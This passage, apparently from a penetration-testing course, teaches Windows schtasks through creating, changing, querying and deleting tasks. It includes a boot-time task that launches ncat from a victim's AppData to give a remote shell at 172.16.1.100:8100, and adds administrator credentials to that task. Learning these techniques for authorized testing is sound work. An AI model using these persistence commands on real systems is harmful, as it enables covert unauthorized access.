- `/tr`: we must give it an action to take

Everything else is optional. Let us see an example below of how we could create a task to help us get a shell.
#### New Task Creation

```cmd
C:\htb> schtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100"

SUCCESS: The scheduled task "My Secret Task" has successfully been created.
```

**A great example of a use for schtasks would be providing us with a callback every time the host boots up. This would ensure that if our shell dies, we will get a callback from the host the next time a reboot occurs, making it likely that we will only lose access to the host for a short time if something happens or the host is shut down. 
We can create or modify a new task by adding a new trigger and action. In our task above, we have schtasks execute Ncat locally, which we placed in the user's AppData directory, and connect to the host `172.16.1.100` on port `8100`. If successfully executed, this connection request should connect to our command and control framework (Metasploit, Empire, etc.) and give us shell access.**

> Now let us look at what modifying a task would look like.
### Change the Properties of a Scheduled Task

#### Change Syntax

| Action   | Parameter  | Description                                           |
| -------- | ---------- | ----------------------------------------------------- |
| `Change` |            | Allows for modifying existing scheduled tasks.        |
|          | `/tn`      | Designates the task to change.                        |
|          | `/tr`      | Modifies the program or action that the task runs in. |
|          | `/ENABLE`  | Change the state of the task to Enabled               |
|          | `/DISABLE` | Change the state of the task to Disabled              |
> Ok, now let us say that we found the `hash` of the local admin password and want to use it to spawn our Ncat shell for us; if anything happens, we can modify the task like so to ad in the credentials for it to use.

```cmd
C:\htb> schtasks /change /tn "My Secret Task" /ru administrator /rp "P@ssw0rd"

SUCCESS: The parameters of scheduled task "My Secret Task" have been changed.
```

> Now to make sure our changes took, we can query for the specific task using the `/tn` parameter and see:

```cmd
C:\htb> schtasks /query /tn "My Secret Task" /V /fo list 

Folder: \
HostName:                             DESKTOP-Victim
TaskName:                             \My Secret Task
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               DESKTOP-victim\htb-admin
Task To Run:                          C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At system start up

<SNIP>  
```

It looks like our changes were saved successfully. Managing tasks and making changes is pretty simple. We need to ensure our syntax is correct, or it may not fire. If we want to ensure it works, we can use the `/run` parameter to kick the task off immediately.

We have `queried`, `created` and `changed` tasks up to this point. Let us look at how to delete them now. 
### Delete the Scheduled Task

| Action   | Parameter | Description                                               |
| -------- | --------- | --------------------------------------------------------- |
| `Delete` |           | Remove a task from the schedule                           |
|          | `/tn`     | Identifies the task to delete                             |
|          | `/s`      | Specifies the name or IP address to delete the task from. |
|          | `/u`      | Specifies the user to run the task as.                    |
|          | `/p`      | Specifies the password to run the task as.                |
|          | `/f`      | Stops the confirmation warning.                           |
```cmd
C:\htb> schtasks /delete  /tn "My Secret Task" 

WARNING: Are you sure you want to remove the task "My Secret Task" (Y/N)?
```

> Running `schtasks /delete` is simple enough. The thing to note is that if we not supply the `/F` option, we will be prompted, like in the example above, for you to supply input. 

Using `/F` will delete the task and suppress the message.

Schtasks can be a great way to leverage the host to run actions for us as admins and pentesters. Take some time to practice creating, modifying and deleting tasks. 

By now, we should be comfortable with `cmd.exe` and its workings. Let's level up and start working in Powershell!

